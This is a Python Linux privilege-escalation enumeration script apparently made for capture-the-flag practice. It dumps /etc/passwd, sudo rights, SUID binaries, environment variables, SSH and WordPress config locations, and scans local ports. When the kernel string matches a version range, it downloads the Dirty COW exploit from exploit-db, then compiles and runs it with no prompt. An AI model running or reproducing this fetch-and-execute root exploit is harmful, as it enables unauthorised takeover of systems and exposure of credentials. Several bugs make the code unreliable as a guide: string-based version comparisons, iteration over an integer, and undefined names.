#/usr/bin/python
#/usr/bin/python3

# Author: hackername
# search me on: try hack me at hackername

# Scope: Privilege escalation

# How it works:
# ////////////////////////////////////////////////////////////////////////////////////////////////////////


# This is a script that search some vulnerabilities or information on the system.
# IT WORKS ONLY ON BASH SYSTEMS so you can run it in Linux and Mac OS.
# If you want to change this script or customize it for you you can do it! It is open source!!!

# usage:
# $python rocket.py 
# $python2 rocket.py 
# $python3 rocket.py 
# $python3.9 rocket.py 

# exaple:
# python3 rocket.py 

# ////////////////////////////////////////////////////////////////////////////////////////////////////////


# importing some libraries...

import os
import platform
import subprocess
import sys
import socket
from os import system
from zipfile import ZipFile


# define some classes...
class color:
	red = '\033[31m'
	green = '\033[32m'
	yellow = '\033[33m'
	blue = '\033[34m'
	underline = '\033[4m'
	reset = '\033[0m'


# functions...

# open a file
def file(files):
	try:
		with open(files, 'r') as f:  # open file in input
			content = f.read()
			print(content)

	except (IOError, OSError) as e:
			print(f'{color.red}ERROR: {e}{color.reset}')
			print(f'{color.red}\n[-]{files} scan not completed!{color.reset}')

	except:
		print(f'{color.red}[-]ERROR: unknown error{color.reset}')
		print(f'{color.red}\n[-]{files} scan not completed!{color.reset}')



# take a look inside a dir...
def dir(path):

	try:
		# inputs
		directory = os.system(f'ls -lha {path}')

		# searching the dirs...
		for files in directory:
			print(f'\n{files}')  # print file

	except (OSError, IOError) as e:
		print(f'{color.red}ERROR: {e}{color.reset}')
		print(f'{color.red}[-]{path} directory scan not completed{olor.reset}')

	except:
		print(f'{color.red}[-]ERROR: unknown error{color.reset}')
		print(f'{color.red}[-]{path} directory scan not completed{color.reset}')


 

def ports(ip,r):

	try:

		for port in range(0,r):
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 		# configuring socket
			result = sock.connect_ex((ip, port))		# connecting ip
			
			if result == 0:			# if port is open
				print(color.green + "port {}: open".format(port) + color.reset)

			sock.close 		# close connection


	except socket.error as e:
		print(f'{color.red}\n[-]an error occurred: {e}{color.reset}')

	except socket.gaierror as e:
		print(f'{color.red}\n[-]an error occurred: {e}{color.reset}')



def dirtyCow():
	print(f'{color.yellow}{color.underline}\n\ntesting Dirty Cow exploit{color.reset}')

	try: 

		print(f'{color.blue}\ndownloading exploit{color.reset}')
		os.system(f'curl https://www.exploit-db.com/download/40839 -o dirty.c;gcc -pthread dirty.c -o dirty -lcrypt; chmod +x dirty; ./dirty')		# downloading and executing exploit

	except (IOError, OSError) as e:
		print(f'{color.red}\n[-]there was an error: {e}{color.reset}')


def banner():
	print('this is a banner')



print("\n" * 2)

# import terminal
os.environ['TERM'] = 'xterm'

# clear screen
os.system('clear')

# run program
print(f'{color.green}{color.underline}Script started\n\n\n{color.reset}')
banner()


# colors legend
print(f''''{color.yellow}{color.underline}\n\n\nColors legend:{color.reset}
{color.yellow}- Yellow for titles
{color.blue}- Blue for neutral info
{color.green}- Green for vulnerabilities and critical info
{color.red}- Red for bankruptcy information{color.reset}''')


# info about os
print(f'{color.yellow}{color.underline}\n\nOS info:{color.reset}')

# /etc/lsb-release file
print(f'{color.yellow}\n[*] /etc/lsb-release file:{color.reset}')
file('/etc/lsb-release')

# kernel version
print(f'{color.yellow}\nkernel version:{color.reset}')
kernel = platform.release()
print(platform.system())  # linux, windows ecc...
print(kernel)  # kernel
if kernel >= '5.8.0':
	print(f'{color.red}[-]the kernel has a good version{color.reset}')

else:
	print(f'{color.green}[+]the kernel has a old version, search for vulnerabilities{color.reset}')

# trying dirty cow exploit
dirtyCowMin = '2.6.22'
dirtyCowMax = '3.9'
if kernel >= dirtyCowMin and kernel <= dirtyCowMax:
	try:
		dirtyCow()

	except KeyboardInterrupt:
		print(f'{color.red}Stoppped with ctrl+c{color.reset}')

# enviroment
print(f'{color.yellow}\nenviroment settings:{color.reset}')
os.system("printenv")

# user info
print(f'{color.yellow}{color.underline}\n\nusers info:{color.reset}')

# user id, group ecc...
print(f'{color.yellow}\nid{color.reset}')
try:
	os.system('id')  # id info

except OSError as error:
	print(f'{color.red}[-]{e}{color.reset}')

except:
	print(f'{color.red}[-]ERROR: unknown error{color.red}')


# users in the system
print(f'{color.yellow}\nusers in the system:{color.reset}')
file('/etc/group')

# privileged users in the system
print(f'{color.yellow}\nprivileged users in the system:{color.reset}')
os.system('cat /etc/group | grep :0:')

# users with shell in the system
print(f'{color.yellow}\nusers with shell in the system:{color.reset}')
os.system('cat /etc/passwd |grep /bin/bash')
os.system('cat /etc/passwd |grep /bin/sh')
os.system('cat /etc/passwd |grep /bin/zsh')

# programs
print(f'{color.yellow}{color.underline}\n\nprograms:{color.reset}')

# sudo version 
print(f'{color.yellow}\n[*] sudo version:{color.reset}')
os.system('sudo -V')

# python version
print(f'{color.yellow}\npython version:{color.reset}')

v = sys.version
print(f'{color.blue}[*] your Python version is:{color.reset}{v}')

# apache version
print(f'{color.yellow}\napache version{color.reset}')
os.system("httpd -v")

#running programs
print(f'{color.yellow}\nrunning programs:{color.reset}')

v = sys.version

if v <= "2.7.18":

	proc1 = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
	proc2 = subprocess.Popen(['grep', 'root'], stdin=proc1.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

	proc1.stdout.close()  # Allow proc1 to receive a SIGPIPE if proc2 exits.
	out, err = proc2.communicate()

	print('out: {0}'.format(out))
	print('err: {0}'.format(err))
	print(f'{color.blue}[*] program running as root completed!{color.reset}')

else:
	os.system('ps aux | grep root')

	print(f'{color.blue}[*] program running as root completed!{color.reset}')


# files + dir
print(f'{color.yellow}{color.underline}\n\nfiles + dir in the system:{color.reset}')

# suid files + sudoers files
print(f'{color.yellow}\nsuid + sudoers files:{color.reset}')

try:

	try:
		os.system('find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null')  # search with find

		try:
			os.system('sudo -l')  # sudoers

		except KeyboardInterrupt:
			print(f'{color.red}[-]Stopped whit ctrl+c{color.reset}')	

	except KeyboardInterrupt:  # if CTRL+C exit
		print(f'{color.red}[-]You pressed ctrl + c{color.reset}')
		print(f'{color.red}\n[*] Sudoers file  not completed!{color.reset}')

	except OSError as e:
		print(f'{color.red}[-]{e}{color.reset}')

	except:
		print(f'{color.red}[-]ERROR: unknown error{color.reset}')

except:
	print(f'{color.red}[-]SUID + SUDOERS file scan not completed{color.reset}')

# /etc/passwd
print(f'{color.yellow}\n/etc/passwd file:{color.reset}')
file('/etc/passwd')

# /etc/crontab
print(f'{color.yellow}\n/etc/crontab file:{color.reset}')
file('/etc/crontab')

# ssh keys
print(f'{color.yellow}\n/etc/ssh keys:{color.reset}')
dir('/etc/ssh')

# /var/log
print(f'{color.yellow}\n/var/log dir:{color.reset}')
dir('/var/log') 

# /var/log/apache*
print(f'{color.yellow}\n/var/log/apache* file:{color.reset}')

try:
	file('/var/log/apache')

except (IOError, OSError): 
	file('/var/log/apache2')

except:
	file('/var/log/apache3')

# /home dir
print(f'{color.yellow}\n\n\nhome{color.reset}')
dir('/home')

# /root dir
print(f'{color.yellow}\n\n\nroot{color.reset}')
dir('/root')

# /etc dir
print(f'{color.yellow}\n\n\netc{color.reset}')
dir('/etc')

# /tmp dir
print(f'{color.yellow}\n\n\ntmp{color.reset}')
dir('/tmp')

# /opt dir
print(f'{color.yellow}\n\n\nopt{color.reset}')
dir('/opt')

# /media dir
print(f'{color.yellow}\n\n\nmedia{color.reset}')
dir('/media')

# /usr dir
print(f'{color.yellow}\n\n\nusr{color.reset}')
dir('/usr')

# /usr/sbin
print(f'{color.yellow}\n\n\n/usr/sbin{color.reset}')
dir('/usr/sbin')

# /mnt dir
print(f'{color.yellow}\n\n\nmnt{color.reset}')
dir('/mnt')

# /bin
print(f'{color.yellow}\n\n\nbin{color.reset}')
dir('/bin')

# /sbin
print(f'{color.yellow}\n\n\nsbin{color.reset}')
dir('/sbin')

# /dev dir
print(f'{color.yellow}\n\n\ndev{color.reset}')
dir('/dev')

# /var/lib/mysql
print(f'{color.yellow}\n/var/lib/mysql dir:{color.reset}')
dir('/var/lib/mysql') 

# /var/www
print(f'{color.yellow}\n/var/www dir:{color.reset}')
dir('/var/www')

# /var/www/wp-config
print(f'{color.yellow}\n/var/www/wp-config file:{color.reset}')
file('/var/www/wp-config')
 
# checking if is present /opt/backup
print(f'{color.yellow}\nchecking if /opt/backup is present{color.reset}')
dir('/opt/backup')

# tasks/jobs
print(f'{color.yellow}{color.underline}\n\ntasks + jobs in the system:{color.reset}')

# running programs
print(f'{color.yellow}\nrunning programs:{color.reset}')
os.system("ps aux")

# cron jobs
print(f'{color.yellow}\n/etc/cron.d dir:{color.reset}')
dir('/etc/cron.d')



# networking
print(f'{color.yellow}{color.underline}\n\nnetworking:{color.reset}')

#interface configuration
print(f'{color.yellow}\ninterface configuration:{color.reset}')
os.system("ifconfig")

# arp history
print(f'{color.yellow}\narp history file:{color.reset}')
file('/proc/net/arp')

# fast port scanning
print(f'{color.yellow}\nopen ports in the system:{color.reset}')

ports('127.0.0.1',9999)



# nfs config
print(f'{color.yellow}{color.underline}\n\nnfs configuration:{color.reset}')

# open *.conf files
print(f'{color.yellow}\nconfiguration files:{color.reset}')
os.system("find /etc | grep .conf")

# end
print(f'{color.green}{color.underline}\n\nScript anded\n\n\n{color.reset}')
